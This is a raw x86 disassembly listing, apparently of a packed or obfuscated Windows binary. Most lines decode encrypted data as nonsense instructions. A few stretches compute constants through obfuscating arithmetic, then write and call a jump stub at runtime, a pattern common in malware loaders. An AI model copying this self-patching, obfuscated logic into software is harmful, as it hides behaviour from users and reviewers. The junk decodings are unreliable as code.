  40ffae:	popa   
  40ffaf:	retf   0xa94c
  40ffb2:	shr    BYTE PTR [ebp*2+0x26ed3f2],cl
  40ffb9:	push   ebx
  40ffba:	push   ss
  40ffbb:	call   0x5597:0x5269c595
  40ffc2:	sub    bl,BYTE PTR [ecx]
  40ffc4:	xor    DWORD PTR [edi+ebx*4+0x52dc38d7],esi
  40ffcb:	div    edx
  40ffcd:	shl    DWORD PTR [eax+0x58],1
  40ffd0:	inc    edx
  40ffd1:	sub    ebx,DWORD PTR [edx]
  40ffd3:	push   edi
  40ffd4:	inc    esp
  40ffd5:	sbb    esi,DWORD PTR [eax-0x67b2b6f6]
  40ffdb:	mov    cl,0xeb
  40ffdd:	mov    edi,0x1dd3fedb
  40ffe2:	dec    esi
  40ffe3:	jb     0x40ff97
  40ffe5:	sbb    dl,cl
  40ffe7:	sub    al,dl
  40ffe9:	jmp    0x410029
  40ffeb:	retf   
  40ffec:	lods   eax,DWORD PTR ds:[esi]
  40ffed:	(bad)  
  40ffef:	stos   BYTE PTR es:[edi],al
  40fff0:	repnz sti 
  40fff2:	call   0x9ddc:0x5742574f
  40fff9:	cmp    ah,BYTE PTR [ebp+ecx*2+0x26086008]
  410000:	stos   DWORD PTR es:[edi],eax
  410001:	popa   
  410002:	test   edx,edi
  410004:	std    
  410005:	sbb    esp,DWORD PTR [ebp-0x48]
  410008:	add    ebp,ecx
  41000a:	in     al,dx
  41000b:	adc    eax,0x331c1b16
  410011:	cmp    al,BYTE PTR [ebp-0x24ce3dce]
  410017:	test   eax,0x8d2eef3c
  41001c:	sub    BYTE PTR [esi-0xe],ch
  41001f:	imul   esp,DWORD PTR [edx+edi*1+0x3c8469f9],0xffffffca
  410027:	push   edx
  410028:	pop    eax
  410029:	sbb    WORD PTR [ecx+0x6febe9e2],0x6387
  410032:	lods   al,BYTE PTR ds:[esi]
  410033:	mov    ds:0x921395db,eax
  410038:	adc    ecx,edi
  41003a:	xor    bh,0xd7
  41003d:	or     DWORD PTR [ebx-0xa],0xfffffff4
  410041:	sub    DWORD PTR [edx-0x72],edi
  410044:	jmp    FWORD PTR [eax-0x31]
  410047:	clc    
  410048:	pop    edx
  410049:	out    dx,al
  41004a:	inc    eax
  41004b:	sbb    al,0xce
  41004d:	sti    
  41004e:	mov    bl,0x4e
  410050:	int3   
  410051:	pop    ds
  410052:	sub    DWORD PTR [edi],ebx
  410054:	or     DWORD PTR [esi-0x32b94937],esi
  41005a:	mov    al,0x2e
  41005c:	outs   dx,BYTE PTR ds:[esi]
  41005d:	xchg   eax,esi
  41005f:	and    DWORD PTR [eax+0x111f0524],edx
  410065:	sar    DWORD PTR [ecx],0xc0
  410068:	loope  0x4100b6
  41006a:	and    DWORD PTR [ecx],0x42b44bb1
  410070:	push   es
  410071:	xchg   BYTE PTR [edx+0x6e0bab2e],dh
  410077:	inc    eax
  410078:	mov    edi,0x9f3e1c2e
  41007d:	repnz cmp eax,ecx
  410080:	mov    ?,ebx
  410082:	xor    edx,esp
  410084:	aaa    
  410085:	ret    
  410086:	call   FWORD PTR [ebp-0x1f660525]
  41008c:	ds dec esp
  41008e:	sub    DWORD PTR [ecx-0x45],0xffffffe8
  410092:	push   esp
  410093:	cmp    edi,DWORD PTR [ebx+0x7e]
  410096:	imul   ebp,DWORD PTR [edi],0x6
  410099:	aaa    
  41009a:	repnz adc eax,0x6e045209
  4100a0:	gs repnz das 
  4100a3:	dec    ebp
  4100a4:	xchg   ebp,eax
  4100a5:	mov    eax,ds:0x93e77fd6
  4100aa:	iret   
  4100ab:	push   edx
  4100ac:	jmp    0x458f:0xd1f3aa53
  4100b3:	stos   DWORD PTR es:[edi],eax
  4100b4:	hlt    
  4100b5:	ficomp DWORD PTR [esi+0x3a]
  4100b8:	pushf  
  4100b9:	std    
  4100ba:	adc    BYTE PTR [esi],dl
  4100bc:	xor    ch,bh
  4100be:	xchg   ebx,eax
  4100bf:	sub    eax,0x8541a469
  4100c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4100c5:	cmp    BYTE PTR ds:0xb4987cc7,ah
  4100cb:	mov    dl,0xa5
  4100cd:	push   ebx
  4100ce:	mov    ch,0xf9
  4100d0:	add    ecx,DWORD PTR [edx+0x34bd9194]
  4100d6:	repz imul esi,DWORD PTR [ecx+edx*4],0xffffffdd
  4100db:	push   0x31
  4100dd:	and    ebx,DWORD PTR [edx+edx*4]
  4100e0:	fs icebp 
  4100e2:	aaa    
  4100e3:	jns    0x41015e
  4100e5:	push   ebx
  4100e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4100e7:	int3   
  4100e8:	adc    eax,0xa590a179
  4100ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4100ee:	and    DWORD PTR ds:0xe4b9f556,esi
  4100f4:	out    dx,al
  4100f5:	add    edi,DWORD PTR [edi-0x29e6b9a]
  4100fb:	aam    0x26
  4100fd:	mov    ah,0x85
  4100ff:	xchg   ecx,eax
  410100:	add    al,0xdd
  410102:	rol    bh,0x83
  410105:	dec    edi
  410106:	jbe    0x41015c
  410108:	lds    esi,FWORD PTR [edi-0x4]
  41010b:	enter  0x77b5,0xcf
  41010f:	or     bl,BYTE PTR [eax]
  410111:	in     al,dx
  410112:	mov    edi,0x171701bd
  410117:	push   edx
  410118:	mov    cl,0x21
  41011a:	push   esi
  41011b:	mov    dh,0x47
  41011d:	arpl   WORD PTR [esi+ebx*4+0x4f],dx
  410121:	cmp    BYTE PTR [edx-0x4cfebebf],dl
  410127:	das    
  410128:	add    dh,ch
  41012a:	ds call 0xf2ed0d11
  410130:	mov    al,ds:0xcf98d0b9
  410135:	xchg   ebp,eax
  410136:	dec    ebp
  410137:	outs   dx,DWORD PTR ds:[esi]
  410138:	mov    esi,0xa39042ac
  41013d:	div    BYTE PTR [esi+0x26f35da7]
  410143:	dec    edx
  410144:	test   ebp,ebx
  410146:	clc    
  410147:	pop    esp
  410148:	test   eax,0x725fbceb
  41014d:	mov    edi,0x73c981aa
  410152:	xor    BYTE PTR [ebp-0x6c],dh
  410155:	cmp    eax,0xd3f7dfd0
  41015a:	gs add eax,0x631eaad9
  410160:	cwde   
  410161:	loope  0x410165
  410163:	sbb    al,0x3c
  410165:	daa    
  410166:	into   
  410167:	rol    BYTE PTR [edx],0xd3
  41016a:	fwait
  41016b:	xor    al,BYTE PTR [eax]
  41016d:	xchg   esi,eax
  41016e:	jl     0x410148
  410170:	jmp    0x410138
  410172:	sub    al,0xff
  410174:	adc    BYTE PTR [si+0x21d1],0x5a
  41017a:	in     al,0x3e
  41017c:	adc    al,0x9c
  41017e:	push   eax
  41017f:	push   ss
  410180:	dec    edx
  410181:	mov    edi,0x8a9f010a
  410186:	shl    BYTE PTR [esi],0xf0
  410189:	or     eax,0xd681ba66
  41018e:	add    esp,0xfffffffc
  410191:	stos   BYTE PTR es:[edi],al
  410192:	push   edx
  410193:	sub    dl,BYTE PTR [ebx-0x5]
  410196:	mov    BYTE PTR [edx],bh
  410198:	add    al,0xf2
  41019a:	xchg   edi,eax
  41019b:	leave  
  41019c:	pop    es
  41019d:	ss mov gs,edi
  4101a0:	xor    ch,BYTE PTR [edx+0x78]
  4101a3:	cmp    ecx,DWORD PTR [ebx+0x5ae14d23]
  4101a9:	popf   
  4101aa:	sbb    BYTE PTR [esi+0x2ad7f37c],dh
  4101b0:	out    0xdb,al
  4101b2:	inc    edx
  4101b3:	cwde   
  4101b4:	shl    BYTE PTR [esi],cl
  4101b6:	xor    ch,dh
  4101b8:	fucomip st,st(0)
  4101ba:	shr    DWORD PTR [eax],1
  4101bc:	addr16 pop eax
  4101be:	ror    bl,cl
  4101c0:	fistp  QWORD PTR ds:0x394c7fe8
  4101c6:	push   cs
  4101c7:	sbb    edx,DWORD PTR [ebp+0x65]
  4101ca:	push   edx
  4101cb:	lds    ebx,FWORD PTR [edi-0x50]
  4101ce:	jge    0x410206
  4101d0:	jge    0x410157
  4101d2:	std    
  4101d3:	cs int 0x5
  4101d6:	icebp  
  4101d7:	or     DWORD PTR [ebp+0x2127bdf3],ecx
  4101dd:	inc    eax
  4101de:	xor    BYTE PTR [edi-0x3a],al
  4101e1:	scas   eax,DWORD PTR es:[edi]
  4101e2:	test   al,0x7f
  4101e4:	push   esi
  4101e5:	arpl   WORD PTR [ebp-0x3a81f077],dx
  4101eb:	bound  edi,QWORD PTR [ecx]
  4101ed:	mov    ds:0x20a3aac7,al
  4101f2:	inc    ecx
  4101f3:	retf   
  4101f4:	adc    BYTE PTR [esi*2+0x789d6434],dl
  4101fb:	cmp    DWORD PTR [edi],ebx
  4101fd:	xor    eax,0xc5a52547
  410202:	sub    bl,dh
  410204:	seto   ch
  410207:	push   0x6e
  410209:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41020a:	mov    cl,0x20
  41020c:	jp     0x410210
  41020e:	mov    dh,0x66
  410210:	jae    0x410265
  410212:	jbe    0x41021e
  410214:	jnp    0x410227
  410216:	xor    al,ah
  410218:	pusha  
  410219:	fld    QWORD PTR [edx+0x13ee941a]
  41021f:	ins    BYTE PTR es:[edi],dx
  410220:	(bad)  
  410221:	xchg   esi,eax
  410222:	pop    ds
  410223:	aad    0xf
  410225:	test   DWORD PTR ds:0x8b000004,esi
  41022b:	dec    ebp
  41022c:	mov    BYTE PTR [ebx],dh
  41022e:	sar    BYTE PTR [eax+0x209c],cl
  410234:	div    ecx
  410236:	mov    ecx,DWORD PTR ds:0x422518
  41023c:	mov    ecx,DWORD PTR [ecx+0x1a8]
  410242:	xor    edx,edx
  410244:	sub    ecx,eax
  410246:	mov    eax,DWORD PTR [ebp-0x4c]
  410249:	xor    eax,0x3daa
  41024e:	sub    eax,0x3375
  410253:	or     eax,0x6931
  410258:	lea    eax,[ebp+eax*1-0x6c25]
  41025f:	push   eax
  410260:	mov    eax,DWORD PTR [ebp-0x8c]
  410266:	push   0x18
  410268:	pop    esi
  410269:	div    esi
  41026b:	mov    esi,DWORD PTR [ebp-0x60]
  41026e:	xor    edx,edx
  410270:	div    esi
  410272:	mov    edx,DWORD PTR [ebp-0x44]
  410275:	mov    esi,DWORD PTR [ebp-0x34]
  410278:	xor    eax,edx
  41027a:	xor    edx,edx
  41027c:	div    esi
  41027e:	imul   eax,eax,0x7d2a
  410284:	sub    eax,0x928ded7
  410289:	push   eax
  41028a:	mov    eax,ds:0x422518
  41028f:	add    eax,0xaa
  410294:	push   eax
  410295:	mov    eax,DWORD PTR [ebp-0x3c]
  410298:	sub    ecx,eax
  41029a:	mov    eax,DWORD PTR [ebp-0x24]
  41029d:	push   DWORD PTR [ecx+eax*1+0xbd4]
  4102a4:	call   0x41e9f9
  4102a9:	mov    DWORD PTR [ebp-0x4],eax
  4102ac:	mov    ecx,DWORD PTR ds:0x422620
  4102b2:	lea    eax,[ebp+0x4]
  4102b5:	mov    DWORD PTR [ecx*4+0x422618],eax
  4102bc:	inc    DWORD PTR ds:0x422620
  4102c2:	mov    eax,DWORD PTR [ebp-0x4]
  4102c5:	mov    eax,DWORD PTR [ebp-0x4]
  4102c8:	xor    edx,edx
  4102ca:	shld   edx,eax,0x2
  4102ce:	shl    eax,0x2
  4102d1:	mov    ecx,0xca79a575
  4102d6:	mov    esi,0x9c1b89e8
  4102db:	xor    eax,ecx
  4102dd:	xor    edx,esi
  4102df:	cmp    eax,ecx
  4102e1:	jne    0x4105c9
  4102e7:	cmp    edx,esi
  4102e9:	jne    0x4105c9
  4102ef:	mov    eax,0xca79a571
  4102f4:	mov    edx,esi
  4102f6:	jmp    0x410669
  4102fb:	jmp    0x4105c9
  410300:	sbb    al,0xfc
  410302:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410303:	fs sbb bl,BYTE PTR es:[edx]
  410307:	mov    ebp,0x70cf8d86
  41030c:	lea    eax,[eax-0x4b]
  41030f:	jl     0x4102d4
  410311:	xchg   edx,eax
  410312:	sbb    BYTE PTR [eax],bl
  410314:	mov    esi,0xae181814
  410319:	mov    ebx,0xfff6e07e
  41031e:	shl    BYTE PTR [esi],1
  410320:	(bad)  
  410321:	adc    bh,BYTE PTR [edx+0x68]
  410324:	sbb    dh,BYTE PTR [ecx]
  410326:	jmp    0xa7e7f1d3
  41032b:	jnp    0x410347
  41032d:	cmp    ch,bl
  41032f:	ror    DWORD PTR fs:[edx+0x6],0xa0
  410334:	mov    al,0x47
  410336:	sub    eax,0x14d9472b
  41033b:	enter  0xcd96,0xb6
  41033f:	mov    ds:0x59f21813,eax
  410344:	retf   0xcb30
  410347:	js     0x4102e2
  410349:	mov    ecx,0x36a684bc
  41034e:	xor    eax,0x6ca7d028
  410353:	and    dh,BYTE PTR [eax-0x50]
  410356:	xchg   ebx,eax
  410357:	call   0x6ac9:0x41f248af
  41035e:	pop    edx
  41035f:	mov    BYTE PTR [esi-0x6d],dh
  410362:	cmp    DWORD PTR [ebx+edx*8-0x16],0xfffffffe
  410367:	push   0x4d5b2af7
  41036c:	stos   BYTE PTR es:[edi],al
  41036d:	ror    BYTE PTR [edx],1
  41036f:	jmp    0x2749:0x8745c149
  410376:	lods   eax,DWORD PTR ds:[esi]
  410377:	xor    ebx,DWORD PTR [edi+0x1ebe30d8]
  41037d:	sbb    ah,BYTE PTR [edx+ebp*4]
  410380:	add    DWORD PTR [edi+0x67],esp
  410383:	leave  
  410384:	add    ebp,esp
  410386:	addr16 test al,0xc0
  410389:	and    DWORD PTR [edi],edi
  41038b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41038c:	shr    eax,0x68
  41038f:	repnz pop esi
  410391:	(bad)  
  410392:	les    ebp,FWORD PTR [edx+0x21]
  410395:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410396:	dec    edi
  410397:	sbb    bh,0x82
  41039a:	loopne 0x4103bd
  41039c:	out    dx,al
  41039d:	dec    ebp
  41039e:	dec    edx
  41039f:	inc    edi
  4103a0:	push   ecx
  4103a1:	xor    DWORD PTR ds:0x82f4056c,esp
  4103a7:	aam    0xab
  4103a9:	jb     0x410353
  4103ab:	pop    esp
  4103ac:	jae    0x410348
  4103ae:	cwde   
  4103af:	push   0xa2efc463
  4103b4:	cs ds mov ch,0x65
  4103b8:	pushf  
  4103b9:	in     eax,dx
  4103ba:	xchg   ebx,eax
  4103bb:	(bad)  
  4103bc:	push   eax
  4103bd:	pop    ebp
  4103be:	xor    edx,DWORD PTR [ebx+0x79292625]
  4103c4:	pop    ebx
  4103c5:	mov    edi,0x6800db29
  4103ca:	mov    ecx,DWORD PTR [edx+0x1a5914f]
  4103d0:	sub    al,0x94
  4103d2:	jmp    FWORD PTR [edx+0x2e]
  4103d5:	xor    edi,DWORD PTR ds:0xfaedafb0
  4103db:	mov    ds:0xded1e39e,eax
  4103e0:	std    
  4103e1:	adc    eax,0x3cd5b506
  4103e6:	jmp    FWORD PTR [ecx+edx*8]
  4103e9:	sub    BYTE PTR [edi-0x3c76e743],bh
  4103ef:	mov    ds:0x316015e8,eax
  4103f4:	dec    esi
  4103f5:	out    dx,al
  4103f6:	cmp    ah,BYTE PTR [ecx-0x15]
  4103f9:	test   ah,dh
  4103fb:	ret    
  4103fc:	shr    DWORD PTR [eax+0x534aabf6],cl
  410402:	adc    DWORD PTR [ebx],eax
  410404:	jno    0x4103d8
  410406:	xrelease mov BYTE PTR [ebx+0x2c],bh
  41040a:	test   eax,0x2ad0b676
  41040f:	sbb    BYTE PTR [esp+eax*1-0x1f],bh
  410413:	scas   eax,DWORD PTR es:[edi]
  410414:	cdq    
  410415:	lahf   
  410416:	std    
  410417:	js     0x410495
  410419:	sti    
  41041a:	repz (bad) 
  41041c:	jmp    0x410457
  41041e:	push   0x97de639c
  410423:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410424:	jnp    0x4103d6
  410426:	sbb    al,BYTE PTR [edi-0x2bbd2d05]
  41042c:	xor    ah,BYTE PTR [esp+ebp*8-0x69]
  410430:	or     al,BYTE PTR [eax-0x23]
  410433:	xchg   esi,eax
  410434:	inc    esi
  410435:	jg     0x41045a
  410437:	mov    ss,ebx
  410439:	fiadd  WORD PTR [ebp+eax*2-0x12e1ca6b]
  410440:	rol    ebx,cl
  410442:	es jp  0x410437
  410445:	hlt    
  410446:	mov    eax,0x2b9948e
  41044b:	retf   0xa479
  41044e:	sbb    BYTE PTR [ecx+0x6c2b9c46],bl
  410454:	out    0xa9,eax
  410456:	sub    eax,0xc501fe29
  41045b:	mov    edi,0xae34a62e
  410460:	jmp    0x5388:0xe0da3f3
  410467:	into   
  410468:	pop    ds
  410469:	mov    ebx,0x44b4abc
  41046e:	idiv   DWORD PTR [eax+0x5377fa1f]
  410474:	loop   0x41044e
  410476:	int3   
  410477:	push   ss
  410478:	jl     0x41043c
  41047a:	and    al,0x88
  41047c:	mov    ds,WORD PTR ds:[edi+edx*1+0x6c]
  410481:	cmp    bl,BYTE PTR ds:0x8fea51c4
  410487:	fisubr WORD PTR [ecx+0x15e170d]
  41048d:	fldenv [ecx-0x14]
  410490:	cdq    
  410491:	jge    0x410471
  410493:	ret    
  410494:	ja     0x410453
  410496:	pusha  
  410497:	into   
  410498:	xchg   BYTE PTR [edi-0x61],dl
  41049b:	mov    cl,0x82
  41049d:	push   edx
  41049e:	dec    esp
  41049f:	pop    ebp
  4104a0:	int    0x2e
  4104a2:	(bad)  
  4104a3:	pop    ecx
  4104a4:	repz clc 
  4104a6:	adc    eax,0xd8c09a1b
  4104ab:	inc    eax
  4104ac:	lahf   
  4104ad:	pop    ebp
  4104ae:	xchg   edi,eax
  4104af:	mov    BYTE PTR [ebx-0x78721381],ch
  4104b5:	mov    WORD PTR [eax+0x1e],ss
  4104b8:	pop    edi
  4104b9:	sbb    BYTE PTR [edx],0xa7
  4104bc:	sub    eax,0xd19891b7
  4104c1:	fcmovnu st,st(5)
  4104c3:	cvtps2pd xmm5,QWORD PTR [ecx+0x6]
  4104c7:	les    ecx,FWORD PTR [ebx]
  4104c9:	pop    esi
  4104ca:	(bad)  
  4104cb:	cmp    eax,0x3ef9e41f
  4104d0:	push   es
  4104d1:	lods   al,BYTE PTR ds:[esi]
  4104d2:	xor    edi,DWORD PTR [ecx]
  4104d4:	jmp    0x4104f5
  4104d6:	popf   
  4104d7:	out    0xb3,eax
  4104d9:	scas   eax,DWORD PTR es:[edi]
  4104da:	inc    ebx
  4104db:	bound  esp,QWORD PTR [edi-0x4]
  4104de:	(bad)  
  4104df:	dec    ebx
  4104e0:	mov    edi,0xc86c6128
  4104e6:	int    0x32
  4104e8:	pop    edx
  4104e9:	mov    dh,0xc9
  4104eb:	sbb    eax,0x8c82138c
  4104f0:	xchg   esi,eax
  4104f1:	mov    esp,0x2f40f30a
  4104f6:	pop    es
  4104f7:	inc    ebx
  4104f8:	cmp    eax,0xdae81d56
  4104fd:	mov    fs,WORD PTR [eax+0x62]
  410500:	pop    edi
  410501:	inc    edi
  410502:	scas   al,BYTE PTR es:[edi]
  410503:	jmp    0x4104e4
  410505:	fidiv  DWORD PTR [ecx]
  410507:	leave  
  410508:	in     al,dx
  410509:	xchg   edi,eax
  41050a:	mov    dh,0xac
  41050c:	mov    eax,0x9b3706a2
  410511:	add    ebx,ebp
  410513:	fild   DWORD PTR gs:[eax-0x380f681c]
  41051a:	mov    fs,WORD PTR [edx]
  41051c:	fist   DWORD PTR [eax]
  41051e:	adc    eax,DWORD PTR [esi+0x49efbc92]
  410524:	add    DWORD PTR [eax+edi*2],esp
  410527:	imul   esp,DWORD PTR [ebp+0x706fd575],0xcb1d9216
  410531:	jge    0x410557
  410533:	cld    
  410534:	loopne 0x410511
  410536:	sub    BYTE PTR [ebp+0x25],ah
  410539:	popf   
  41053a:	ds aam 0xe0
  41053d:	and    al,0xa7
  41053f:	lock cmp WORD PTR ds:[edx+0x3b70ff62],dx
  410548:	cmp    BYTE PTR [edx+0x12b8f4ad],bl
  41054e:	scas   eax,DWORD PTR es:[edi]
  41054f:	cmp    ah,ch
  410551:	fdivr  QWORD PTR [ebp+0x13f79f22]
  410557:	pop    esi
  410558:	mov    esi,0x759f23f5
  41055d:	aam    0x9f
  41055f:	cmp    eax,0xa70742d1
  410564:	xor    DWORD PTR [eax+edi*2+0x3d],edi
  410568:	mov    ebp,0x96338b10
  41056d:	out    0xfe,eax
  41056f:	mov    bl,0x9c
  410571:	sub    BYTE PTR [edx+0x74],bh
  410574:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410575:	mov    ds:0xd852467a,eax
  41057a:	add    al,0xcb
  41057c:	or     ebp,DWORD PTR [esi+0x1c]
  41057f:	cmp    BYTE PTR [edi-0x72],ch
  410582:	jne    0x4105a2
  410584:	mov    dl,0x49
  410586:	pop    ds
  410587:	mov    esi,0xbc22fab6
  41058c:	pop    edi
  41058d:	xor    al,0x90
  41058f:	pop    edi
  410590:	dec    edi
  410591:	aam    0x8e
  410593:	push   ebx
  410594:	dec    ecx
  410595:	sbb    BYTE PTR ds:0x7a87ae89,cl
  41059b:	cmp    BYTE PTR [ebx+0x3b62904c],bh
  4105a1:	outs   dx,DWORD PTR ds:[esi]
  4105a2:	in     eax,dx
  4105a3:	(bad)  
  4105a4:	pop    edx
  4105a5:	cmp    bl,BYTE PTR [edi-0x582be2b3]
  4105ab:	cli    
  4105ac:	mov    WORD PTR ds:0x37c584e6,?
  4105b2:	or     dh,BYTE PTR [edx-0x5c]
  4105b5:	retf   0x9fa6
  4105b8:	repnz test al,0xb5
  4105bb:	jns    0x410602
  4105bd:	push   edi
  4105be:	xchg   edi,eax
  4105bf:	jb     0x4105a8
  4105c1:	js     0x41057c
  4105c3:	js     0x4105ad
  4105c5:	add    ebp,DWORD PTR [ecx]
  4105c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4105c8:	mov    dh,0x8d
  4105ca:	inc    ebp
  4105cb:	lock mov DWORD PTR [ebp-0x9c],eax
  4105d2:	mov    eax,DWORD PTR [ebp-0x54]
  4105d5:	mov    DWORD PTR [ebp-0x10],eax
  4105d8:	mov    eax,DWORD PTR [ebp-0x10]
  4105db:	mov    ecx,DWORD PTR [ebp-0x4]
  4105de:	sub    eax,ecx
  4105e0:	mov    DWORD PTR [ebp-0x10],eax
  4105e3:	mov    eax,DWORD PTR [ebp-0x20]
  4105e6:	mov    ecx,DWORD PTR [ebp-0x1c]
  4105e9:	sub    DWORD PTR [ebp-0x10],eax
  4105ec:	mov    eax,DWORD PTR [ebp-0x4]
  4105ef:	mov    DWORD PTR [eax],0x658776e9
  4105f5:	mov    DWORD PTR [eax+0x4],0xab756547
  4105fc:	mov    eax,DWORD PTR [ebp-0x10]
  4105ff:	mov    ecx,DWORD PTR [ebp-0x4]
  410602:	mov    DWORD PTR [ecx+0x1],eax
  410605:	mov    eax,ds:0x422394
  41060a:	push   DWORD PTR [eax]
  41060c:	push   DWORD PTR ds:0x422608
  410612:	push   DWORD PTR ds:0x42239c
  410618:	push   DWORD PTR ds:0x4225e8
  41061e:	push   DWORD PTR ds:0x42265c
  410624:	push   0xa4069aaa
  410629:	push   0xa4069aae
  41062e:	push   DWORD PTR [ebp-0x5c]
  410631:	mov    eax,DWORD PTR [ebp-0x4]
  410634:	call   eax
  410636:	mov    eax,DWORD PTR [edi]
  410638:	mov    eax,DWORD PTR [ebp+0x8]
  41063b:	push   DWORD PTR [eax]
  41063d:	call   0x4110ff
  410642:	mov    eax,ds:0x422518
  410647:	push   0x4
  410649:	add    eax,0x1dc
  41064e:	push   eax
  41064f:	push   edi
  410650:	call   0x415231
  410655:	mov    eax,0xca79a57d
  41065a:	jmp    0x4102f4
  41065f:	mov    eax,0xca79a575
  410664:	mov    edx,0x9c1b89e8
  410669:	pop    esi
  41066a:	pop    ebx
  41066b:	leave  
  41066c:	ret    0x4
  41066f:	push   ebp
  410670:	mov    ebp,esp
  410672:	sub    esp,0x20
  410675:	push   ebx
  410676:	push   edi
  410677:	mov    DWORD PTR [ebp-0x8],0x522e
  41067e:	mov    DWORD PTR [ebp-0x4],0x3dbd
  410685:	mov    DWORD PTR [ebp-0x10],0x53f1
  41068c:	mov    DWORD PTR [ebp-0xc],0x631b
  410693:	mov    DWORD PTR [ebp-0x18],0x524d
  41069a:	mov    DWORD PTR [ebp-0x14],0x1600
  4106a1:	mov    eax,DWORD PTR [ebp-0x18]
  4106a4:	mov    ecx,DWORD PTR [ebp-0x14]
  4106a7:	mov    edx,DWORD PTR [ebp-0x10]
  4106aa:	mov    edi,DWORD PTR [ebp-0xc]
  4106ad:	push   edi
  4106ae:	push   edx
  4106af:	push   ecx
  4106b0:	push   eax
  4106b1:	call   0x416c20
  4106b6:	mov    ecx,DWORD PTR [ebp-0x8]
  4106b9:	mov    edi,DWORD PTR [ebp-0x4]
  4106bc:	add    eax,0x1dc8
  4106c1:	adc    edx,0x6fbf
  4106c7:	and    edx,edi
  4106c9:	push   0x1061
  4106ce:	and    eax,ecx
  4106d0:	or     edx,0x23ff
  4106d6:	push   0x4000022f
  4106db:	jmp    0x4109bb
  4106e0:	pop    edi
  4106e1:	jp     0x410689
  4106e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4106e4:	mov    ds:0x103a5b1c,al
  4106e9:	fsub   QWORD PTR [edi-0x44]
  4106ec:	jb     0x4106c5
  4106ee:	mov    bl,0x7c
  4106f0:	push   0x9a18188e
  4106f5:	adc    al,0x18
  4106f7:	sbb    BYTE PTR [esi-0x19],dl
  4106fa:	test   al,ah
  4106fc:	push   cs
  4106fd:	(bad)  
  4106fe:	sub    eax,0x36e9d725
  410703:	dec    esi
  410704:	fwait
  410705:	inc    esp
  410706:	push   esp
  410707:	mov    edx,DWORD PTR [ebx+0x58]
  41070a:	mov    ecx,0xf8022880
  41070f:	imul   ebp,DWORD PTR [eax-0xb],0x2ce29287
  410716:	dec    ebp
  410717:	(bad)  
  410718:	pop    ebp
  410719:	push   0x1a
  41071b:	or     ecx,DWORD PTR [edi+0x55ed7b86]
  410721:	out    0x5b,eax
  410723:	add    edi,DWORD PTR [ecx+0x54c5e7aa]
  410729:	lds    ecx,FWORD PTR [ecx]
  41072b:	outs   dx,BYTE PTR ds:[esi]
  41072c:	sub    ebp,DWORD PTR [esi+0x14e9432e]
  410732:	icebp  
  410733:	shl    DWORD PTR [esi-0x5ebdae6d],1
  410739:	pushf  
  41073a:	jmp    0x4107b3
  41073c:	out    dx,al
  41073d:	push   es
  41073e:	push   edi
  41073f:	xor    al,dh
  410741:	repnz mov ah,0xe5
  410744:	or     DWORD PTR [ecx+0x29],ebx
  410747:	push   ecx
  410748:	mov    WORD PTR [ebp-0x7a],?
  41074b:	cmc    
  41074c:	scas   eax,DWORD PTR es:[edi]
  41074d:	and    al,0x89
  41074f:	push   es
  410750:	retf   
  410751:	rcr    DWORD PTR [ebx],1
  410753:	inc    ebx
  410754:	jl     0x41077f
  410756:	aad    0xf9
  410758:	inc    edi
  410759:	xchg   DWORD PTR [ebp-0x4],esp
  41075c:	lods   eax,DWORD PTR ds:[esi]
  41075d:	xor    cl,dl
  41075f:	out    dx,eax
  410760:	jmp    0x9c9:0x38498a63
  410767:	cmc    
  410768:	fistp  QWORD PTR ds:0x5dd2e8c8
  41076e:	adc    DWORD PTR [ecx],0xe550703f
  410774:	std    
  410775:	xchg   ecx,eax
  410776:	aas    
  410777:	popa   
  410778:	(bad)  
  410779:	(bad)
  41077c:	pop    esp
  41077d:	xchg   BYTE PTR [ebp-0x2f],al
  410780:	sahf   
  410781:	es mov edx,0x693d99e2
  410787:	hlt    
  410788:	jge    0x410756
  41078a:	jo     0x410768
  41078c:	or     ebp,ebp
  41078e:	xchg   edx,eax
  41078f:	jne    0x410711
  410791:	pusha  
  410792:	cmp    edx,DWORD PTR [eax+0x21]
  410795:	sbb    DWORD PTR [ebp-0x2e],ebp
  410798:	(bad)  
  410799:	jo     0x4107fe
  41079b:	retf   
  41079c:	mov    al,ds:0x60defc87
  4107a1:	gs mov al,0x2b
  4107a4:	sub    DWORD PTR [ebx-0x7e2f6365],ebx
  4107aa:	cmp    al,0xbe
  4107ac:	jecxz  0x4107cb
  4107ae:	jnp    0x4107d6
  4107b0:	pop    es
  4107b1:	pop    es
  4107b2:	mov    esi,0xb8bf33b1
  4107b7:	push   edx
  4107b8:	ins    DWORD PTR es:[edi],dx
  4107b9:	sbb    al,0xc9
  4107bb:	xchg   ebp,eax
  4107bc:	mov    edi,0xaf539507
  4107c1:	add    BYTE PTR [edi-0x19],ch
  4107c4:	mov    dl,0x75
  4107c6:	or     BYTE PTR [eax+0x6c5ecaa7],ch
  4107cc:	xor    DWORD PTR [ecx-0x46],edi
  4107cf:	aaa    
  4107d0:	xchg   edi,eax
  4107d1:	xchg   ebp,eax
  4107d2:	cmp    eax,0x54a4ad0a
  4107d7:	clc    
  4107d8:	ret    
  4107d9:	mov    ah,0xbb
  4107dc:	pop    esp
  4107dd:	dec    ecx
  4107de:	sub    esp,DWORD PTR [edx]
  4107e0:	lock iret 
  4107e2:	dec    ebx
  4107e3:	mov    ds:0xaabaa626,al
  4107e8:	sbb    eax,0xcfae199
  4107ed:	test   al,al
  4107ef:	ins    DWORD PTR es:[edi],dx
  4107f0:	jl     0x410791
  4107f2:	ins    DWORD PTR es:[edi],dx
  4107f3:	mov    edx,0x3bcc24dd
  4107f8:	int3   
  4107f9:	inc    ebp
  4107fa:	mov    edx,DWORD PTR [edi]
  4107fc:	or     dh,BYTE PTR [edx+ebx*1]
  4107ff:	mov    edx,0x1835a9f4
  410804:	jb     0x4107c3
  410806:	sbb    BYTE PTR [esi],dl
  410808:	std    
  410809:	pusha  
  41080a:	dec    ebx
  41080b:	into   
  41080c:	mov    ebx,0x7ec16564
  410811:	popa   
